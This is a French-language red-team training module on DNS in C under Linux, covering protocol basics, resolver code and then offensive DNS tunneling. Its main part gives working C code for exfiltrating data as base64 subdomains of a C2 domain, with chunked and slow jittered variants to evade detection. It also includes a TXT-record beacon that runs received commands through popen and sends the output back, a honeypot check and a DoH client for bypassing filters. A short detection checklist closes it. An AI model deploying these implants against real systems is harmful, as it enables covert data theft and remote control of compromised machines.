# Module L24 : DNS Linux - Tunneling et Exfiltration

## Objectifs

A la fin de ce module, tu vas maîtriser :
- Le protocole DNS et sa structure
- La résolution DNS en C sous Linux
- Les techniques de DNS tunneling
- L'exfiltration de données via DNS
- Le contournement de filtres réseau par DNS

## 1. Fondamentaux DNS

### 1.1 Le protocole DNS

**DNS (Domain Name System)** = annuaire d'Internet qui traduit noms de domaine en adresses IP

```ascii
┌────────────────────────────────────────────────┐
│  RÉSOLUTION DNS - Processus                    │
├────────────────────────────────────────────────┤
│                                                │
│  Application                                   │
│       ↓                                        │
│  gethostbyname("google.com")                   │
│       ↓                                        │
│  ┌──────────────────────┐                      │
│  │  /etc/resolv.conf    │                      │
│  │  nameserver 8.8.8.8  │                      │
│  └──────────────────────┘                      │
│       ↓                                        │
│  Requête DNS UDP:53                            │
│  ┌────────────────────────────┐               │
│  │ Query: google.com A ?      │ ───→          │
│  └────────────────────────────┘       │       │
│                                        ↓       │
│                                   DNS Server   │
│                                   8.8.8.8      │
│                                        │       │
│  ┌────────────────────────────┐      │       │
│  │ Answer: 142.250.185.46     │ ←────┘       │
│  └────────────────────────────┘               │
│       ↓                                        │
│  Retour IP à l'application                     │
│                                                │
└────────────────────────────────────────────────┘
```

### 1.2 Structure d'un paquet DNS

```ascii
┌──────────────────────────────────────────────┐
│  PAQUET DNS                                  │
├──────────────────────────────────────────────┤
│                                              │
│  HEADER (12 bytes)                           │
│  ┌──────────────────────────────────┐       │
│  │ Transaction ID  (2 bytes)        │       │
│  │ Flags           (2 bytes)        │       │
│  │ Questions       (2 bytes)        │       │
│  │ Answers         (2 bytes)        │       │
│  │ Authority RRs   (2 bytes)        │       │
│  │ Additional RRs  (2 bytes)        │       │
│  └──────────────────────────────────┘       │
│                                              │
│  QUESTION SECTION                            │
│  ┌──────────────────────────────────┐       │
│  │ Name: example.com                │       │
│  │ Type: A (1) / AAAA (28) / TXT..  │       │
│  │ Class: IN (1)                    │       │
│  └──────────────────────────────────┘       │
│                                              │
│  ANSWER SECTION (réponse)                    │
│  ┌──────────────────────────────────┐       │
│  │ Name: example.com                │       │
│  │ Type: A                          │       │
│  │ Class: IN                        │       │
│  │ TTL: 3600                        │       │
│  │ Data: 192.0.2.1                  │       │
│  └──────────────────────────────────┘       │
│                                              │
└──────────────────────────────────────────────┘
```

### 1.3 Types d'enregistrements DNS

```ascii
┌────────────────────────────────────────────┐
│  TYPES DNS UTILES POUR RED TEAM            │
├────────────────────────────────────────────┤
│                                            │
│  A      - IPv4 address                     │
│           Exemple: example.com → 1.2.3.4   │
│           Usage: Basic tunneling           │
│                                            │
│  AAAA   - IPv6 address                     │
│           Exemple: example.com → ::1       │
│           Usage: Plus de bande passante    │
│                                            │
│  TXT    - Text record                      │
│           Exemple: "v=spf1 include:..."    │
│           Usage: Exfiltrer texte/commandes │
│           Capacité: ~255 bytes par record  │
│                                            │
│  CNAME  - Canonical name                   │
│           Exemple: www → example.com       │
│           Usage: Redirection               │
│                                            │
│  MX     - Mail exchange                    │
│           Moins suspect pour exfil         │
│                                            │
│  NULL   - Null record                      │
│           Usage: Payload binaire           │
│                                            │
└────────────────────────────────────────────┘
```

## 2. Résolution DNS en C

### 2.1 Résolution basique avec gethostbyname

```c
// dns_resolve.c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <netdb.h>
#include <arpa/inet.h>

// Résoudre hostname en IP
int resolve_hostname(const char *hostname, char *ip) {
    struct hostent *he;
    struct in_addr **addr_list;

    he = gethostbyname(hostname);
    if (he == NULL) {
        herror("gethostbyname");
        return -1;
    }

    addr_list = (struct in_addr **)he->h_addr_list;

    for (int i = 0; addr_list[i] != NULL; i++) {
        strcpy(ip, inet_ntoa(*addr_list[i]));
        return 0;
    }

    return -1;
}

int main(int argc, char *argv[]) {
    if (argc != 2) {
        printf("Usage: %s <hostname>\n", argv[0]);
        return 1;
    }

    char ip[100];
    if (resolve_hostname(argv[1], ip) == 0) {
        printf("%s resolved to %s\n", argv[1], ip);
    }

    return 0;
}
```

### 2.2 Résolution DNS avec getaddrinfo (moderne)

```c
// dns_getaddrinfo.c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netdb.h>
#include <arpa/inet.h>

void resolve_host(const char *hostname) {
    struct addrinfo hints, *res, *p;
    int status;
    char ipstr[INET6_ADDRSTRLEN];

    memset(&hints, 0, sizeof hints);
    hints.ai_family = AF_UNSPEC;     // IPv4 ou IPv6
    hints.ai_socktype = SOCK_STREAM;

    if ((status = getaddrinfo(hostname, NULL, &hints, &res)) != 0) {
        fprintf(stderr, "getaddrinfo: %s\n", gai_strerror(status));
        return;
    }

    printf("IP addresses for %s:\n", hostname);

    for (p = res; p != NULL; p = p->ai_next) {
        void *addr;
        char *ipver;

        if (p->ai_family == AF_INET) {
            struct sockaddr_in *ipv4 = (struct sockaddr_in *)p->ai_addr;
            addr = &(ipv4->sin_addr);
            ipver = "IPv4";
        } else {
            struct sockaddr_in6 *ipv6 = (struct sockaddr_in6 *)p->ai_addr;
            addr = &(ipv6->sin6_addr);
            ipver = "IPv6";
        }

        inet_ntop(p->ai_family, addr, ipstr, sizeof ipstr);
        printf("  %s: %s\n", ipver, ipstr);
    }

    freeaddrinfo(res);
}

int main(int argc, char *argv[]) {
    if (argc != 2) {
        printf("Usage: %s <hostname>\n", argv[0]);
        return 1;
    }

    resolve_host(argv[1]);
    return 0;
}
```

### 2.3 Requête DNS raw avec sockets UDP

```c
// dns_raw.c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <netinet/in.h>

#define DNS_PORT 53
#define BUFFER_SIZE 512

// Structure header DNS
typedef struct {
    uint16_t id;
    uint16_t flags;
    uint16_t qdcount;  // Questions
    uint16_t ancount;  // Answers
    uint16_t nscount;  // Authority RRs
    uint16_t arcount;  // Additional RRs
} DNSHeader;

// Encoder un nom de domaine en format DNS
// example.com → 7example3com0
void encode_dns_name(const char *host, unsigned char *dns) {
    int lock = 0;
    strcat((char*)host, ".");

    for (int i = 0; i < strlen((char*)host); i++) {
        if (host[i] == '.') {
            *dns++ = i - lock;
            for (; lock < i; lock++) {
                *dns++ = host[lock];
            }
            lock++;
        }
    }
    *dns++ = '\0';
}

// Créer requête DNS type A
int create_dns_query(unsigned char *buffer, const char *hostname, uint16_t query_id) {
    DNSHeader *dns = (DNSHeader *)buffer;
    unsigned char *qname = buffer + sizeof(DNSHeader);

    // Header
    dns->id = htons(query_id);
    dns->flags = htons(0x0100);  // Standard query, recursion desired
    dns->qdcount = htons(1);
    dns->ancount = 0;
    dns->nscount = 0;
    dns->arcount = 0;

    // Question
    encode_dns_name(hostname, qname);

    // Type A (1) et Class IN (1)
    int qname_len = strlen((char*)qname) + 1;
    unsigned char *qtype = qname + qname_len;
    *(uint16_t*)qtype = htons(1);      // Type A
    qtype += 2;
    *(uint16_t*)qtype = htons(1);      // Class IN
    qtype += 2;

    return sizeof(DNSHeader) + qname_len + 4;
}

// Envoyer requête DNS
int send_dns_query(const char *hostname, const char *dns_server) {
    int sock;
    struct sockaddr_in server;
    unsigned char buffer[BUFFER_SIZE];
    int query_len;

    // Créer socket UDP
    sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if (sock < 0) {
        perror("socket");
        return -1;
    }

    // Configuration serveur DNS
    server.sin_family = AF_INET;
    server.sin_port = htons(DNS_PORT);
    server.sin_addr.s_addr = inet_addr(dns_server);

    // Créer requête
    query_len = create_dns_query(buffer, hostname, 1234);

    // Envoyer
    if (sendto(sock, buffer, query_len, 0,
               (struct sockaddr*)&server, sizeof(server)) < 0) {
        perror("sendto");
        close(sock);
        return -1;
    }

    // Recevoir réponse
    int recv_len = recvfrom(sock, buffer, BUFFER_SIZE, 0, NULL, NULL);
    if (recv_len < 0) {
        perror("recvfrom");
        close(sock);
        return -1;
    }

    printf("Received %d bytes\n", recv_len);

    close(sock);
    return 0;
}

int main() {
    send_dns_query("google.com", "8.8.8.8");
    return 0;
}
```

## 3. DNS Tunneling

### 3.1 Principe du DNS Tunneling

```ascii
┌──────────────────────────────────────────────────┐
│  DNS TUNNELING - Exfiltration                    │
├──────────────────────────────────────────────────┤
│                                                  │
│  Attacker Machine         DNS Server (C2)        │
│  ════════════════         ════════════           │
│                                                  │
│  1. Données à exfiltrer                          │
│  ┌────────────────┐                              │
│  │ Password: root │                              │
│  │ admin123       │                              │
│  └────────────────┘                              │
│       ↓                                          │
│  2. Encoder en sous-domaine                      │
│  ┌────────────────────────────────┐              │
│  │ cm9vdC1hZG1pbjEyMw.c2.evil.com │              │
│  │ └─base64 data──┘  └─domain─┘  │              │
│  └────────────────────────────────┘              │
│       ↓                                          │
│  3. Requête DNS                                  │
│  ┌────────┐                                      │
│  │ Query  │── DNS Query A ─────────────→         │
│  │        │   cm9vdC1hZG1pbjEyMw...   ┌────────┐│
│  │        │                            │ C2 DNS ││
│  │        │                            │ Server ││
│  │        │←── Answer: 127.0.0.1 ─────│        ││
│  └────────┘                            └────────┘│
│                                            ↓     │
│                                       Decode &   │
│                                       Log data   │
│                                                  │
│  Avantages:                                      │
│  • DNS rarement bloqué                           │
│  • Pas d'établissement connexion TCP            │
│  • Traverse firewalls facilement                 │
│                                                  │
└──────────────────────────────────────────────────┘
```

### 3.2 Exfiltration DNS simple

```c
// dns_exfil.c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <netdb.h>

#define C2_DOMAIN "c2.example.com"

// Encoder data en base64 (simplifié)
static const char base64_chars[] =
    "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";

char *base64_encode(const unsigned char *data, size_t len) {
    size_t out_len = 4 * ((len + 2) / 3);
    char *result = malloc(out_len + 1);
    if (!result) return NULL;

    for (size_t i = 0, j = 0; i < len;) {
        uint32_t octet_a = i < len ? data[i++] : 0;
        uint32_t octet_b = i < len ? data[i++] : 0;
        uint32_t octet_c = i < len ? data[i++] : 0;
        uint32_t triple = (octet_a << 16) + (octet_b << 8) + octet_c;

        result[j++] = base64_chars[(triple >> 18) & 0x3F];
        result[j++] = base64_chars[(triple >> 12) & 0x3F];
        result[j++] = base64_chars[(triple >> 6) & 0x3F];
        result[j++] = base64_chars[triple & 0x3F];
    }

    result[out_len] = '\0';
    return result;
}

// Remplacer caractères non-DNS friendly
void sanitize_for_dns(char *str) {
    for (int i = 0; str[i]; i++) {
        if (str[i] == '+') str[i] = '-';
        if (str[i] == '/') str[i] = '_';
        if (str[i] == '=') str[i] = '\0';  // Supprimer padding
    }
}

// Exfiltrer données via DNS
int dns_exfiltrate(const char *data) {
    char *encoded = base64_encode((unsigned char*)data, strlen(data));
    sanitize_for_dns(encoded);

    // Construire sous-domaine: <data>.<c2_domain>
    char query[512];
    snprintf(query, sizeof(query), "%s.%s", encoded, C2_DOMAIN);

    printf("[*] DNS Query: %s\n", query);

    // Effectuer requête DNS (peu importe la réponse)
    struct hostent *he = gethostbyname(query);

    free(encoded);
    return (he != NULL) ? 0 : -1;
}

// Chunker pour gros payloads (limite 63 chars par label)
int dns_exfiltrate_chunked(const char *data) {
    char *encoded = base64_encode((unsigned char*)data, strlen(data));
    sanitize_for_dns(encoded);

    int chunk_size = 60;  // Max 63 - marge sécurité
    int total_len = strlen(encoded);
    int chunk_id = 0;

    // Découper en chunks
    for (int i = 0; i < total_len; i += chunk_size) {
        char chunk[64];
        int copy_len = (i + chunk_size > total_len) ?
                       total_len - i : chunk_size;

        strncpy(chunk, encoded + i, copy_len);
        chunk[copy_len] = '\0';

        // Format: <chunk_id>-<chunk>.<c2_domain>
        char query[512];
        snprintf(query, sizeof(query), "%d-%s.%s",
                 chunk_id++, chunk, C2_DOMAIN);

        printf("[*] Chunk %d: %s\n", chunk_id - 1, query);
        gethostbyname(query);

        usleep(100000);  // Sleep 100ms entre chunks
    }

    free(encoded);
    return 0;
}

int main() {
    // Test simple
    dns_exfiltrate("admin:password123");

    // Test chunked
    printf("\n[*] Testing chunked exfil...\n");
    dns_exfiltrate_chunked("This is a longer message that will be "
                           "split into multiple DNS queries");

    return 0;
}
```

### 3.3 Requêtes TXT pour commandes C2

```c
// dns_c2_txt.c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <arpa/nameser.h>
#include <resolv.h>

// Parser réponse DNS TXT
char *dns_query_txt(const char *domain) {
    unsigned char response[NS_PACKETSZ];
    ns_msg msg;
    ns_rr rr;
    int response_len;

    // Initialiser resolver
    res_init();

    // Requête DNS type TXT
    response_len = res_query(domain, ns_c_in, ns_t_txt,
                             response, sizeof(response));

    if (response_len < 0) {
        return NULL;
    }

    // Parser réponse
    if (ns_initparse(response, response_len, &msg) < 0) {
        return NULL;
    }

    // Extraire premier record TXT
    if (ns_msg_count(msg, ns_s_an) > 0) {
        if (ns_parserr(&msg, ns_s_an, 0, &rr) == 0) {
            const unsigned char *rdata = ns_rr_rdata(rr);
            int len = rdata[0];  // Premier byte = longueur

            char *txt = malloc(len + 1);
            memcpy(txt, rdata + 1, len);
            txt[len] = '\0';

            return txt;
        }
    }

    return NULL;
}

// Beacon DNS via TXT records
void dns_beacon() {
    char query[256];
    char beacon_id[] = "beacon123";

    while (1) {
        // Requête commande: <beacon_id>.cmd.<c2_domain>
        snprintf(query, sizeof(query), "%s.cmd.c2.example.com", beacon_id);

        printf("[*] Polling C2 via DNS TXT...\n");
        char *command = dns_query_txt(query);

        if (command) {
            printf("[+] Received command: %s\n", command);

            // Exécuter commande
            FILE *fp = popen(command, "r");
            if (fp) {
                char output[4096] = {0};
                fread(output, 1, sizeof(output) - 1, fp);
                pclose(fp);

                // Exfiltrer résultat
                dns_exfiltrate_chunked(output);
            }

            free(command);
        }

        sleep(60);  // Polling toutes les 60 secondes
    }
}

int main() {
    dns_beacon();
    return 0;
}
```

**Compilation** :
```bash
gcc -o dns_c2_txt dns_c2_txt.c -lresolv
```

## 4. Applications Offensives

### 4.1 Détection d'environnement

```c
// dns_canary.c
// Vérifier si on est dans un environnement monitoré via DNS

#include <stdio.h>
#include <stdlib.h>
#include <netdb.h>
#include <time.h>

int check_dns_monitoring() {
    char canary[128];
    time_t t = time(NULL);

    // Générer domaine unique
    snprintf(canary, sizeof(canary), "canary-%ld.test.example.com", t);

    struct hostent *he = gethostbyname(canary);

    if (he != NULL) {
        // Si résolution réussit sur domaine random, probablement honeypot
        printf("[!] DNS wildcard detected - possible monitoring\n");
        return 1;
    }

    return 0;
}
```

### 4.2 Slow exfil pour éviter détection

```c
// dns_slow_exfil.c
#include <stdio.h>
#include <stdlib.h>
#include <time.h>

int dns_slow_exfil(const char *data) {
    char *encoded = base64_encode((unsigned char*)data, strlen(data));
    sanitize_for_dns(encoded);

    int total_len = strlen(encoded);
    int chunk_size = 30;  // Petits chunks

    for (int i = 0; i < total_len; i += chunk_size) {
        char chunk[64];
        int copy_len = (i + chunk_size > total_len) ?
                       total_len - i : chunk_size;

        strncpy(chunk, encoded + i, copy_len);
        chunk[copy_len] = '\0';

        char query[512];
        snprintf(query, sizeof(query), "%d-%s.slow.c2.example.com",
                 i / chunk_size, chunk);

        gethostbyname(query);

        // Jitter aléatoire entre 5-15 secondes
        int jitter = 5 + (rand() % 10);
        printf("[*] Sleeping %d seconds...\n", jitter);
        sleep(jitter);
    }

    free(encoded);
    return 0;
}
```

### 4.3 DNS over HTTPS (DoH) pour évasion

```c
// doh_client.c
// Utiliser DNS over HTTPS pour bypass filtrage DNS

#include <stdio.h>
#include <curl/curl.h>

char *doh_query(const char *domain) {
    CURL *curl;
    CURLcode res;
    char url[512];
    char *response = NULL;

    // Google DoH endpoint
    snprintf(url, sizeof(url),
             "https://dns.google/resolve?name=%s&type=A", domain);

    curl = curl_easy_init();
    if (!curl) return NULL;

    curl_easy_setopt(curl, CURLOPT_URL, url);
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_callback);
    curl_easy_setopt(curl, CURLOPT_WRITEDATA, &response);

    res = curl_easy_perform(curl);

    curl_easy_cleanup(curl);

    return (res == CURLE_OK) ? response : NULL;
}
```

## 5. Détection et Contre-mesures

### 5.1 Indicateurs de DNS tunneling

```ascii
┌──────────────────────────────────────────┐
│  DÉTECTION DNS TUNNELING                 │
├──────────────────────────────────────────┤
│                                          │
│  Signes suspects:                        │
│  • Sous-domaines très longs (>50 chars)  │
│  • Sous-domaines aléatoires/encoded      │
│  • Volume élevé de requêtes              │
│  • Requêtes régulières (beacon)          │
│  • Types inhabituels (TXT, NULL)         │
│  • Entropie élevée des noms              │
│                                          │
│  Blue Team défense:                      │
│  • Monitoring logs DNS                   │
│  • Baseline trafic normal                │
│  • Alertes sur anomalies                 │
│  • Bloquer domaines suspects             │
│  • Rate limiting DNS                     │
│                                          │
└──────────────────────────────────────────┘
```

## Checklist

- [ ] Je comprends le protocole DNS
- [ ] Je sais faire des requêtes DNS en C
- [ ] Je maîtrise la résolution avec getaddrinfo
- [ ] Je peux créer des requêtes DNS raw
- [ ] Je comprends le principe du DNS tunneling
- [ ] Je sais exfiltrer des données via DNS
- [ ] Je connais les techniques d'évasion (DoH, jitter)
- [ ] Je comprends les limites (63 chars/label, 255 total)

## Exercices

Voir [exercice.md](exercice.md)
